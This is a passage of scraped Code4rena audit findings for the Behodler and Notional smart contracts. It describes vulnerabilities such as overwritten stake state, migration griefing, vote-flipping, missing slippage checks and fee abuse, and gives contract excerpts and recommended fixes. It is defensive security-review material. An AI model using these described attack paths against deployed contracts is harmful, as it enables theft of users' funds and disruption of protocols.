[burnFlashGovernanceAsset()](https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/DAO/FlashGovernanceArbiter.sol#L124)  will simply overwrite the user's state with `pendingFlashDecision[targetContract][user] = flashGovernanceConfig;` as seen below.  ```   function burnFlashGovernanceAsset(     address targetContract,     address user,     address asset,     uint256 amount   ) public virtual onlySuccessfulProposal {     if (pendingFlashDecision[targetContract][user].assetBurnable) {       Burnable(asset).burn(amount);     }      pendingFlashDecision[targetContract][user] = flashGovernanceConfig;   } ```  Since `flashGovernanceConfig` is not modified in [BurnFlashStakeDeposit.execute()](https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/DAO/Proposals/BurnFlashStakeDeposit.sol#L39) the user will have `amount` set to the current config amount which is likely what they originally transferred in {assertGovernanceApproved()](https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/DAO/FlashGovernanceArbiter.sol#L60).   Furthermore, `unlockTime` will be set to the config unlock time.  The config unlock time is the length of time in seconds that proposal should lock tokens for not the future timestamp. That is unlock time may be say `7 days` rather than `now + 7 days`. As a result the check in [withdrawGovernanceAsset()](https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/DAO/FlashGovernanceArbiter.sol#L146)  `pendingFlashDecision[targetContract][msg.sender].unlockTime < block.timestamp,` will always pass unless there is a significant misconfiguration.  ## Recommended Mitigation Steps  Consider deleting the user's data (i.e. `delete pendingFlashDecision[targetContract][user]`) rather than setting it to the config. This would ensure the user cannot withraw any funds afterwards.  Alternatively, only update `pendingFlashDecision[targetContract][user].amount` to subtract the amount sent as a function parameter and leave the remaining fields untouched.  "}, {"title": "Loss Of Flash Governance Tokens If They Are Not Withdrawn Before The Next Request", "html_url": "https://github.com/code-423n4/2022-01-behodler-findings/issues/156", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-behodler-findings", "body": "# Handle  kirk-baird   # Vulnerability details  ## Impact  Users who have not called [withdrawGovernanceAsset()](https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/DAO/FlashGovernanceArbiter.sol#L142)  after  they have locked their tokens from a previous proposal (i.e. [assertGovernanceApproved](https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/DAO/FlashGovernanceArbiter.sol#L60)), will lose their tokens if [assertGovernanceApproved()](https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/DAO/FlashGovernanceArbiter.sol#L60) is called again with the same `target` and `sender`.  The `sender` will lose `pendingFlashDecision[target][sender].amount` tokens and the tokens will become unaccounted for and locked in the contract. Since the new amount is not added to the previous amount, instead the previous amount is overwritten with the new amount.  The impact of this is worsened by another vulnerability, that is [assertGovernanceApproved()](https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/DAO/FlashGovernanceArbiter.sol#L60) is a `public` function and may be called by any arbitrary user so long as the `sender` field has called `approve()` for `FlashGovernanceArbiter` on the ERC20 token. This would allow an attacker to make these tokens inaccessible for any arbitrary `sender`.  ## Proof of Concept  In [assertGovernanceApproved()](https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/DAO/FlashGovernanceArbiter.sol#L60) as seen below, the line`pendingFlashDecision[target][sender] = flashGovernanceConfig` will overwrite the previous contents. Thereby, making any previous rewards unaccounted for and inaccessible to anyone.  Note that we must wait `pendingFlashDecision[target][sender].unlockTime` between calls.  ```   function assertGovernanceApproved(     address sender,     address target,     bool emergency   ) public {     if (       IERC20(flashGovernanceConfig.asset).transferFrom(sender, address(this), flashGovernanceConfig.amount) &&       pendingFlashDecision[target][sender].unlockTime < block.timestamp     ) {       require(         emergency || (block.timestamp - security.lastFlashGovernanceAct > security.epochSize),         \"Limbo: flash governance disabled for rest of epoch\"       );       pendingFlashDecision[target][sender] = flashGovernanceConfig;       pendingFlashDecision[target][sender].unlockTime += block.timestamp;        security.lastFlashGovernanceAct = block.timestamp;       emit flashDecision(sender, flashGovernanceConfig.asset, flashGovernanceConfig.amount, target);     } else {       revert(\"LIMBO: governance decision rejected.\");     }   } ```   ## Recommended Mitigation Steps  Consider updating the initial if statement to ensure the `pendingFlashDecision` for that `target` and `sender` is empty, that is: ```   function assertGovernanceApproved(     address sender,     address target,     bool emergency   ) public {     if (       IERC20(flashGovernanceConfig.asset).transferFrom(sender, address(this), flashGovernanceConfig.amount) &&       pendingFlashDecision[target][sender].unlockTime == 0     ) { ... ```  Note we cannot simply add the new `amount` to the previous `amount` incase the underlying `asset` has been changed.  "}, {"title": "The system can get to a \"stuck\" state if a bad proposal (proposal that can't be executed) is accepted", "html_url": "https://github.com/code-423n4/2022-01-behodler-findings/issues/153", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-behodler-findings", "body": "# Handle  CertoraInc   # Vulnerability details  ## LimboDAO.sol (`updateCurrentProposal()` modifier and `makeProposal()` function) The LimboDAO contract has a variable that indicates the current proposal - every time there can be only one proposal. The only way a proposal can be done and a new proposal can be registered is to finish the previous proposal by either accepting it and executing it or by rejecting it. If a proposal that can't succeed, like for example an `UpdateMultipleSoulConfigProposal` proposal that has too much tokens and not enough gas, will stuck the system if it will be accepted. Thats because its time will pass - the users won't be able to vote anymore (because the `vote` function will revert), and the proposal can't be executed - the `execute` function will revert. So the proposal won't be able to be done and the system will be stuck because new proposal won't be able to be registered.  When trying to call the `executeCurrentProposal()` function that activates the `updateCurrentProposal()` modifier, the modifier will check the balance of fate, it will see that it's positive and will call `currentProposalState.proposal.orchestrateExecute()` to execute the proposal. the proposal will revert and cancel it all (leaving the proposal as the current proposal with `voting` state).  When trying to call `makeProposal()` function to make a new proposal it will revert because the current proposal is not equal to address(0).  To sum up, the system can get to a \"stuck\" state if a bad proposal (proposal that can't be executed) is accepted.  "}, {"title": "not emitting `ClaimedReward` event ", "html_url": "https://github.com/code-423n4/2022-01-behodler-findings/issues/148", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2022-01-behodler-findings", "body": "# Handle  CertoraInc   # Vulnerability details  ## Limbo.sol (`_unstake()` and `stake()` functions)  not emitting the `ClaimedReward` event when the user claims his rewards (also when staking and getting the current reward, I don't know if it is done in purpose but just making sure)  "}, {"title": "user won't be able to get his rewards in case of staking with amount = 0", "html_url": "https://github.com/code-423n4/2022-01-behodler-findings/issues/146", "labels": ["bug", "question", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-behodler-findings", "body": "# Handle  CertoraInc   # Vulnerability details  ## Limbo.sol (`stake()` function) if a user has a pending reward and he call the `stake` function with `amount = 0`, he won't be able to get his reward (he won't get the reward, and the reward debt will cover the reward)  that's happening because the reward calculation is done only if the staked amount (given as a parameter) is greater than 0, and it updates the reward debt also if the amount is 0, so the reward debt will be updated without the user will be able to get his reward  "}, {"title": "You can flip governance decisions without extending vote duration", "html_url": "https://github.com/code-423n4/2022-01-behodler-findings/issues/106", "labels": ["bug", "question", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-behodler-findings", "body": "# Handle  camden   # Vulnerability details  ## Impact The impact here is that a user can, right at the end of the voting period, flip the decision without triggering the logic to extend the vote duration. The user doesn't even have to be very sophisticated: they can just send one vote in one transaction to go to 0, then in a subsequent transaction send enough to flip the vote.  ## Proof of Concept https://github.com/code-423n4/2022-01-behodler/blob/608cec2e297867e4d954a63fecd720e80c1d5ae8/contracts/DAO/LimboDAO.sol#L281 You can send exactly enough fate to send the fate amount to 0, then send fate to change the vote. You'll never trigger this logic.  On the first call, to send the currentProposalState.fate to 0, `(fate + currentFate) * fate == 0`, so we won't extend the proposal state.  Then, on the second call, to actually change the vote, `fate * currentFate == 0` because `currentFate` is 0.   ## Recommended Mitigation Steps Make sure that going to 0 is equivalent to a flip, but going away from 0 isn't a flip.  "}, {"title": "Calling `generateFLNQuote` twice in every block prevents any migration", "html_url": "https://github.com/code-423n4/2022-01-behodler-findings/issues/102", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-behodler-findings", "body": "# Handle  camden   # Vulnerability details  # Impact and PoC https://github.com/code-423n4/2022-01-behodler/blob/71d8e0cfd9388f975d6a90dffba9b502b222bdfe/contracts/UniswapHelper.sol#L138 In the Uniswap helper, `generateFLNQuote` is public, so any user can generate the latest quote. If you call this twice in any block, then the two latest flan quotes will have a `blockProduced` value of the current block's number.  These quotes are used in the `_ensurePriceStability` function. The last require statement here is key: https://github.com/code-423n4/2022-01-behodler/blob/71d8e0cfd9388f975d6a90dffba9b502b222bdfe/contracts/UniswapHelper.sol#L283-L285  This function will revert if this statement is false: ``` localFlanQuotes[0].blockProduced - localFlanQuotes[1].blockProduced > VARS.minQuoteWaitDuration ``` Since `VARS.minQuoteWaitDuration` is a `uint256`, it is at least 0 ``` localFlanQuotes[0].blockProduced - localFlanQuotes[1].blockProduced > 0 ``` But, as we've shown above, we can create a transaction in every block that will make `localFlanQuotes[0].blockProduced - localFlanQuotes[1].blockProduced == 0`. In any block we can make any call to `_ensurePriceStability` revert.  `_ensurePriceStability` is called in the `ensurePriceStability` modifier: https://github.com/code-423n4/2022-01-behodler/blob/71d8e0cfd9388f975d6a90dffba9b502b222bdfe/contracts/UniswapHelper.sol#L70  This modifier is used in `stabilizeFlan`:  https://github.com/code-423n4/2022-01-behodler/blob/71d8e0cfd9388f975d6a90dffba9b502b222bdfe/contracts/UniswapHelper.sol#L162  Lastly, `stabilizeFlan` is used in `migrate` in `Limbo.sol` https://github.com/code-423n4/2022-01-behodler/blob/71d8e0cfd9388f975d6a90dffba9b502b222bdfe/contracts/Limbo.sol#L234  Therefore, we can grief a migration in any block. In reality, the `minQuoteWaitDuration` would be set to a much higher value than 0, making this even easier to grief for people (you only need to call `generateFLNQuote` every `minQuoteWaitDuration - 1` blocks to be safe).  # Mitigation Mitigation is to just use a time weighted oracle for uniswap.  "}, {"title": "Unnecessary if else in `UniswapHelper.configure()`", "html_url": "https://github.com/code-423n4/2022-01-behodler-findings/issues/89", "labels": ["bug", "disagree with severity", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-behodler-findings", "body": "# Handle  Ruhum   # Vulnerability details  ## Impact The if else here doesn't really do anything. Might as well just remove it: https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/UniswapHelper.sol#L132  ## Recommended Mitigation Steps `VARS.precision = precision`  "}, {"title": "Add emergency stop for specific stablecoins in `FlanBackstop`", "html_url": "https://github.com/code-423n4/2022-01-behodler-findings/issues/88", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-behodler-findings", "body": "# Handle  Ruhum   # Vulnerability details  ## Impact The recent events concerning MIM showed that stablecoins are not always worth $1. It might be worth it to add an option to stop accepting a specific stablecoin for the time being in `FlanBackstop`.  https://coinmarketcap.com/currencies/magic-internet-money/  Generally, it would allow someone to mint `PyroFlan` for cheaper than expected. Whether there are more possible attack vectors is not entirely clear to me.  I'd argue that you don't lose much by adding it.  ## Proof of Concept Currently, a backer can only be updated through a proposal which will most likely take too long: https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/FlanBackstop.sol#L63  ## Tools Used none  ## Recommended Mitigation Steps Allow pausing the use of specific backers. Using the `governanceApproved()` modifier might be good  "}, {"title": "`LimboDAO.killDAO()` doesn't update the DAO address of `FlanBackstop`, `UniswapHelper`, and `ProposalFactory`", "html_url": "https://github.com/code-423n4/2022-01-behodler-findings/issues/86", "labels": ["bug", "1 (Low Risk)", "disagree with severity", "resolved", "sponsor confirmed"], "target": "2022-01-behodler-findings", "body": "# Handle  Ruhum   # Vulnerability details  ## Impact `LimboDAO.killDAO()` is used to assign control of the contracts to a new DAO. Currently, it only updates `Flan` & `Limbo`. But, `FlanBackstop`, `UniswapHelper`, and `ProposalFactory` also depend on the DAO. Those are not updated. The new DAO loses control over them.  ## Proof of Concept https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/DAO/LimboDAO.sol#L226  ## Tools Used none  ## Recommended Mitigation Steps Instead of calling `setDAO()` on hardcoded address, the function should allow passing an array of addresses for which `setDAO()` is called.  ```sol function killDAO(address[] calldata a, address newOwner) public onlyOwner isLive {     domainConfig.live = false;     for (uint i; i < a.length; i++) {         Governable(a[i]).setDAO(newOwner);     }     emit daoKilled(newOwner);   } ```  "}, {"title": "Remove duplicate call to save gas", "html_url": "https://github.com/code-423n4/2022-01-behodler-findings/issues/79", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-behodler-findings", "body": "# Handle  Ruhum   # Vulnerability details  ## Impact There's a duplicate call here: https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/FlanBackstop.sol#L93-L94  Remove it to reduce gas   "}, {"title": "`approveUnstake` is unsafe ", "html_url": "https://github.com/code-423n4/2022-01-behodler-findings/issues/55", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-behodler-findings", "body": "# Handle  CertoraInc   # Vulnerability details  Similar to ERC20.approve, `approveUnstake()` is unsafe due to the fact that it set the allowance to a fixed number and doesn't increase or decrease it. Usually, the `ERC20.approve` doesn't get much attention because they leave it to the user to make sure his operation is safe, however here the user cannot do it because the `unstakeApproval` state variable is private and there is no getter for it.  In `ERC20.approve` users can simply check the allowance and change it in the same transaction and eliminate the risk, but here it's impossible.  ## Impact Users will not be able to change the allowance of the unstake without the risk of the frontrunning stealing like the classic `ERC20.approve` (there the risk can be removed). This will cause users to not change allowance for users that they don't 100% trust which can be problematic  ## Proof of Concept The function that sets the allowance to a fixed number: https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/Limbo.sol#L606-L612  The private map state variable that has no getter (in solidity state variables are automatically private unless declared otherwise) https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/Limbo.sol#L288  ## Tools Used Manual code review  ## Recommended Mitigation Steps If you insist changing the allowance to a fixed number and not increase it or decrease it, at least make the allowance public so it can be checked before changing  "}, {"title": "Gas saving removing variable", "html_url": "https://github.com/code-423n4/2022-01-behodler-findings/issues/50", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-behodler-findings", "body": "# Handle  0x1f8b   # Vulnerability details  ## Impact Detailed description of the impact of this finding.  ## Proof of Concept Removing the variable `_redeemRate` and using only the call `redeemRate()` in the method `mint` inside the contract `RebaseProxy` it`s possible to save gas. It will save gas if the case of `transferFrom` failure.  ``` function mint(address to, uint256 amount)         public         override         returns (uint256)     {         uint256 _redeemRate = redeemRate();         require(             IERC20(baseToken).transferFrom(msg.sender, address(this), amount)         );         uint256 baseBalance = IERC20(baseToken).balanceOf(address(this));         uint256 proxy = (baseBalance * ONE) / _redeemRate;         _mint(to, proxy);     } ```  ## Tools Used Manual review.  ## Recommended Mitigation Steps Remove the mentioned argument.  "}, {"title": "A Malicious Treasury Manager Can Burn Treasury Tokens By Setting `makerFee` To The Amount The Maker Receives", "html_url": "https://github.com/code-423n4/2022-01-notional-findings/issues/230", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-01-notional-findings", "body": "# Handle  leastwood   # Vulnerability details  ## Impact  The treasury manager contract holds harvested assets/`COMP` from Notional which are used to perform `NOTE` buybacks or in other areas of the protocol. The manager account is allowed to sign off-chain orders used on 0x to exchange tokens to `WETH` which can then be deposited in the Balancer LP and distributed to `sNOTE` holders.  However, `_validateOrder` does not validate that `takerFee` and `makerFee` are set to zero, hence, it is possible for a malicious manager to receive tokens as part of a swap, but the treasury manager contract receives zero tokens as `makerFee` is set to the amount the maker receives. This can be abused to effectively burn treasury tokens at no cost to the order taker.  ## Proof of Concept  https://github.com/0xProject/0x-monorepo/blob/0571244e9e84b9ad778bccb99b837dd6f9baaf6e/contracts/exchange/contracts/src/MixinExchangeCore.sol#L196-L250  https://github.com/0xProject/0x-monorepo/blob/0571244e9e84b9ad778bccb99b837dd6f9baaf6e/contracts/exchange-libs/contracts/src/LibFillResults.sol#L59-L91  https://github.com/code-423n4/2022-01-notional/blob/main/contracts/utils/EIP1271Wallet.sol#L147-L188 ``` function _validateOrder(bytes memory order) private view {     (         address makerToken,         address takerToken,         address feeRecipient,         uint256 makerAmount,         uint256 takerAmount     ) = _extractOrderInfo(order);      // No fee recipient allowed     require(feeRecipient == address(0), \"no fee recipient allowed\");      // MakerToken should never be WETH     require(makerToken != address(WETH), \"maker token must not be WETH\");      // TakerToken (proceeds) should always be WETH     require(takerToken == address(WETH), \"taker token must be WETH\");      address priceOracle = priceOracles[makerToken];      // Price oracle not defined     require(priceOracle != address(0), \"price oracle not defined\");      uint256 slippageLimit = slippageLimits[makerToken];      // Slippage limit not defined     require(slippageLimit != 0, \"slippage limit not defined\");      uint256 oraclePrice = _toUint(         AggregatorV2V3Interface(priceOracle).latestAnswer()     );      uint256 priceFloor = (oraclePrice * slippageLimit) /         SLIPPAGE_LIMIT_PRECISION;      uint256 makerDecimals = 10**ERC20(makerToken).decimals();      // makerPrice = takerAmount / makerAmount     uint256 makerPrice = (takerAmount * makerDecimals) / makerAmount;      require(makerPrice >= priceFloor, \"slippage is too high\"); } ```  ## Tools Used  Manual code review.  ## Recommended Mitigation Steps  Consider checking that `makerFee == 0` and `takerFee == 0` in `EIP1271Wallet._validateOrder` s.t. the treasury manager cannot sign unfair orders which severely impact the `TreasuryManager` contract.  "}, {"title": "Prefix (`++i`), rather than postfix (`i++`), increment/decrement operators should be used in for-loops", "html_url": "https://github.com/code-423n4/2022-01-notional-findings/issues/228", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-01-notional-findings", "body": "# Handle  IllIllI   # Vulnerability details  ## Impact When the value of the post-loop increment/decrement is not stored or used in any calculations, the prefix increment/decrement operators (`++i`/`--i`) cost less gas PER LOOP than the postfix increment/decrement operators (`i++`/`i--`)  ## Proof of Concept There is one example of this issue in the codebase:  ```Solidity for (uint256 i; i < currencies.length; i++) {         ``` https://github.com/code-423n4/2022-01-notional/blob/main/contracts/TreasuryAction.sol#L157   ## Tools Used Code inspection  ## Recommended Mitigation Steps Use `++i` rather than `i++` in all places  "}, {"title": "`getVotingPower` Truncates Result Leading To Inaccuracies In Voting Power", "html_url": "https://github.com/code-423n4/2022-01-notional-findings/issues/222", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2022-01-notional-findings", "body": "# Handle  leastwood   # Vulnerability details  ## Impact  The `getVotingPower` function is an essential part of Notional's on-chain governance. However, the `priceRatio` calculation includes a division which slightly truncates the result which is then used in calculating `noteAmount` which also divides the result.  ## Proof of Concept  https://github.com/code-423n4/2022-01-notional/blob/main/contracts/sNOTE.sol#L271-L293 ``` function getVotingPower(uint256 sNOTEAmount) public view returns (uint256) {     // Gets the BPT token price (in ETH)     uint256 bptPrice = IPriceOracle(address(BALANCER_POOL_TOKEN)).getLatest(IPriceOracle.Variable.BPT_PRICE);     // Gets the NOTE token price (in ETH)     uint256 notePrice = IPriceOracle(address(BALANCER_POOL_TOKEN)).getLatest(IPriceOracle.Variable.PAIR_PRICE);          // Since both bptPrice and notePrice are denominated in ETH, we can use     // this formula to calculate noteAmount     // bptBalance * bptPrice = notePrice * noteAmount     // noteAmount = bptPrice/notePrice * bptBalance     uint256 priceRatio = bptPrice * 1e18 / notePrice;     uint256 bptBalance = BALANCER_POOL_TOKEN.balanceOf(address(this));      // Amount_note = Price_NOTE_per_BPT * BPT_supply * 80% (80/20 pool)     uint256 noteAmount = priceRatio * bptBalance * 80 / 100;      // Reduce precision down to 1e8 (NOTE token)     // priceRatio and bptBalance are both 1e18 (1e36 total)     // we divide by 1e28 to get to 1e8     noteAmount /= 1e28;      return (noteAmount * sNOTEAmount) / totalSupply(); } ```  ## Tools Used  Manual code review.  ## Recommended Mitigation Steps  Consider performing all multiplication before division to minimise the degree of truncation by the final result.  "}, {"title": "Double _requireAccountNotInCoolDown", "html_url": "https://github.com/code-423n4/2022-01-notional-findings/issues/214", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-01-notional-findings", "body": "# Handle  Tomio   # Vulnerability details  ## Impact The check to make sure account is not in cool down is happening twice, on _mint() and _beforeTokenTransfer(), _beforeTokenTransfer() already has a _requireAccountNotInCoolDown() an the _mint() inside erc20upgradable will call the _beforeTokenTransfer(), this can make unnecessary call in the https://github.com/code-423n4/2022-01-notional/blob/main/contracts/sNOTE.sol#L328.  ## Proof of Concept https://github.com/code-423n4/2022-01-notional/blob/main/contracts/sNOTE.sol#L328.  ## Tools Used  ## Recommended Mitigation Steps  "}, {"title": "Optimization on _redeemAndTransfer", "html_url": "https://github.com/code-423n4/2022-01-notional-findings/issues/213", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-01-notional-findings", "body": "# Handle  Tomio   # Vulnerability details  ## Impact There is unnecessary if else condition on _redeemAndTransfer(), and can be optimized by removing the inline if else condition on line https://github.com/code-423n4/2022-01-notional/blob/main/contracts/TreasuryAction.sol#L137-L140  ## Proof of Concept https://github.com/code-423n4/2022-01-notional/blob/main/contracts/TreasuryAction.sol#L137-L140  ## Tools Used  ## Recommended Mitigation Steps From: ```     if (underlying.tokenAddress == address(0)) {             WETH9(WETH).deposit{value: address(this).balance}();         }          address underlyingAddress = underlying.tokenAddress == address(0)             ? address(WETH)             : underlying.tokenAddress;         IERC20(underlyingAddress).safeTransfer(treasuryManagerContract, redeemedExternalUnderlying); ```  To: ```     if (underlying.tokenAddress == address(0)) {             WETH9(WETH).deposit{value: address(this).balance}();             IERC20(WETH).safeTransfer(treasuryManagerContract, redeemedExternalUnderlying);         }else{             IERC20(underlying.tokenAddress).safeTransfer(treasuryManagerContract, redeemedExternalUnderlying);         } ```  "}, {"title": "MAX_SHORTFALL_WITHDRAW limit on BTP extraction is not enforced", "html_url": "https://github.com/code-423n4/2022-01-notional-findings/issues/209", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-01-notional-findings", "body": "# Handle  gellej   # Vulnerability details  ## Impact   The function `extractTokensForCollateralShortfall()` allows the owner of the sNote contract to withdraw up to 50% of the total amount of BPT.   Presumably, this 50% limit is in place to prevent the owner from \"rug-pulling\" the sNote holders (or at least to give them a guarantee that their loss is limited to 50% of the underlying value).   However, this limit is easily circumvented as the function can simply be called a second, third and fourth time, to withdraw almost all of the BPT.   As the contract does not enforce this limit, the bug requires stakers to trust the governance to not withdraw more than 50% of the underlying collateral. This represents a higher risk for the stakers, which may  also result in a larger discount on sNote wrt its BPT collateral (this is why I classified the bug as medium risk - users may lose value - not from an exploit, but from the lack of enforcing the 50% rule)  # Proof of Concept  See above. The code affected is here: https://github.com/code-423n4/2022-01-notional/blob/main/contracts/sNOTE.sol#L100    ## Recommended Mitigation Steps  Rewrite the logic and enforce a limit during a time period - i.e. do not allow to withdraw over 50% _per week_ (or any time period that is longer than the cooldown period, so that users have time to withdraw their collateral)  "}, {"title": "Unused state variables", "html_url": "https://github.com/code-423n4/2022-01-notional-findings/issues/204", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-01-notional-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact Unused state variables: ```solidity     uint256 public constant BPT_TOKEN_PRECISION = 1e18;     uint256 internal constant ETH_PRECISION = 1e18;     uint32 public refundGasPrice; ``` Either remove them or use them where intended.  "}, {"title": "Gas: `reserveInternal.subNoNeg(bufferInternal)` can be unchecked", "html_url": "https://github.com/code-423n4/2022-01-notional-findings/issues/199", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-01-notional-findings", "body": "# Handle  cmichel   # Vulnerability details  The `reserveInternal.subNoNeg(bufferInternal)` computation in `TreasuryAction.transferReserveToTreasury` can be a standard, unchecked subtraction as `if (reserveInternal <= bufferInternal) continue;` is checked before this computation.   "}, {"title": "`makerPrice` assumes oracle price is always in 18 decimals", "html_url": "https://github.com/code-423n4/2022-01-notional-findings/issues/198", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2022-01-notional-findings", "body": "# Handle  cmichel   # Vulnerability details  The `EIP1271Wallet._validateOrder` function computes a `makerPrice` which ends up in `takerAmount` decimals which are 18 decimals as `takerToken` is always `WETH`. It is compared to the `priceFloor` return value from chainlink which must therefore also be in 18 decimals. This seems to be the case for this old deprecated API but should be fixed and adjusted to use the oracle decimals if Chainlink is upgraded to the new API.  ## Recommended Mitigation Steps Upgrade and adjust the decimals of `makerPrice` to match `priceFloor` decimals.   "}, {"title": "Missing parameter validation", "html_url": "https://github.com/code-423n4/2022-01-notional-findings/issues/195", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed"], "target": "2022-01-notional-findings", "body": "# Handle  cmichel   # Vulnerability details  Some parameters of functions are not checked for invalid values: - `TreasuryManager.setPriceOracle: oracleAddress`: could break things - `TreasuryManager.setSlippageLimit: slippageLimit`: should be `<= SLIPPAGE_LIMIT_PRECISION`  ## Impact Wrong user input or wallets defaulting to the zero addresses for a missing input can lead to the contract needing to redeploy or wasted gas.  ## Recommended Mitigation Steps Validate the parameters.  "}, {"title": "`sNOTE.sol#_mintFromAssets()` Lack of slippage control", "html_url": "https://github.com/code-423n4/2022-01-notional-findings/issues/181", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-01-notional-findings", "body": "# Handle  WatchPug   # Vulnerability details  ttps://github.com/code-423n4/2022-01-notional/blob/d171cad9e86e0d02e0909eb66d4c24ab6ea6b982/contracts/sNOTE.sol#L195-L209  ```solidity BALANCER_VAULT.joinPool{value: msgValue}(     NOTE_ETH_POOL_ID,     address(this),     address(this), // sNOTE will receive the BPT     IVault.JoinPoolRequest(         assets,         maxAmountsIn,         abi.encode(             IVault.JoinKind.EXACT_TOKENS_IN_FOR_BPT_OUT,             maxAmountsIn,             0 // Accept however much BPT the pool will give us         ),         false // Don't use internal balances     ) ); ```  The current implementation of `mintFromNOTE()` and `mintFromETH()` and `mintFromWETH()` (all are using `_mintFromAssets()` with `minimumBPT` hardcoded to `0`) provides no parameter for slippage control, making it vulnerable to front-run attacks.  ### Recommendation  Consider adding a `minAmountOut` parameter for these functions.  "}, {"title": "Missing validation check in totalSupply()", "html_url": "https://github.com/code-423n4/2022-01-notional-findings/issues/170", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2022-01-notional-findings", "body": "# Handle  SolidityScan   # Vulnerability details  ## Description The value of `totalSupply()` at https://github.com/code-423n4/2022-01-notional/blob/main/contracts/sNOTE.sol#L260 does not check if the value of totalSupply is 0 or not and it is per   ## Impact The return value for the function `getPoolTokenShare` can be invalid because if there's an error in the `totalSupply()` the code at Line 260 will evaluate to divide by zero creating inconsistencies in the function logic.   ## Proof of Concept 1. Check the function at https://github.com/code-423n4/2022-01-notional/blob/main/contracts/sNOTE.sol#L257-L261 2. At line 260 we will notice that the value of totalSupply() is directly being used to perform division to the multiplication of `bptBalance * sNOTEAmount`   ## Recommended Mitigation Steps Add a check if the value of `totalSupply()` is zero or not or some other edge cases that can cause inconsistencies.   "}, {"title": "`getVotingPower` Is Not Equipped To Handle On-Chain Voting", "html_url": "https://github.com/code-423n4/2022-01-notional-findings/issues/165", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-01-notional-findings", "body": "# Handle  leastwood   # Vulnerability details  ## Impact  As `NOTE` continues to be staked in the `sNOTE` contract, it is important that Notional's governance is able to correctly handle on-chain voting by calculating the relative power `sNOTE` has in terms of its equivalent `NOTE` amount.   `getVotingPower` is a useful function in tracking the relative voting power a staker has, however, it does not utilise any checkpointing mechanism to ensure the user's voting power is a snapshot of a specific block number. As a result, it would be possible to manipulate a user's voting power by casting a vote on-chain and then have them transfer their `sNOTE` to another account to then vote again.  ## Proof of Concept  https://github.com/code-423n4/2022-01-notional/blob/main/contracts/sNOTE.sol#L271-L293 ``` function getVotingPower(uint256 sNOTEAmount) public view returns (uint256) {     // Gets the BPT token price (in ETH)     uint256 bptPrice = IPriceOracle(address(BALANCER_POOL_TOKEN)).getLatest(IPriceOracle.Variable.BPT_PRICE);     // Gets the NOTE token price (in ETH)     uint256 notePrice = IPriceOracle(address(BALANCER_POOL_TOKEN)).getLatest(IPriceOracle.Variable.PAIR_PRICE);          // Since both bptPrice and notePrice are denominated in ETH, we can use     // this formula to calculate noteAmount     // bptBalance * bptPrice = notePrice * noteAmount     // noteAmount = bptPrice/notePrice * bptBalance     uint256 priceRatio = bptPrice * 1e18 / notePrice;     uint256 bptBalance = BALANCER_POOL_TOKEN.balanceOf(address(this));      // Amount_note = Price_NOTE_per_BPT * BPT_supply * 80% (80/20 pool)     uint256 noteAmount = priceRatio * bptBalance * 80 / 100;      // Reduce precision down to 1e8 (NOTE token)     // priceRatio and bptBalance are both 1e18 (1e36 total)     // we divide by 1e28 to get to 1e8     noteAmount /= 1e28;      return (noteAmount * sNOTEAmount) / totalSupply(); } ```  ## Tools Used  Manual code review.  ## Recommended Mitigation Steps  Consider implementing a `getPriorVotingPower` function which takes in a `blockNumber` argument and returns the correct balance at that specific block.  "}, {"title": "Gas Optimization: Unnecessary comparison", "html_url": "https://github.com/code-423n4/2022-01-notional-findings/issues/161", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-01-notional-findings", "body": "# Handle  gzeon   # Vulnerability details  ## Impact In `_requireAccountNotInCoolDown` if `block.timestamp < coolDown.redeemWindowEnd`, we must have `coolDown.redeemWindowEnd > 0` hence `0 < coolDown.redeemWindowBegin`  https://github.com/code-423n4/2022-01-notional/blob/d171cad9e86e0d02e0909eb66d4c24ab6ea6b982/contracts/sNOTE.sol#L308 ```         bool isInCoolDown = (0 < coolDown.redeemWindowBegin && block.timestamp < coolDown.redeemWindowEnd);         require(!isInCoolDown, \"Account in Cool Down\"); ``` to  ```         require(block.timestamp >= coolDown.redeemWindowEnd, 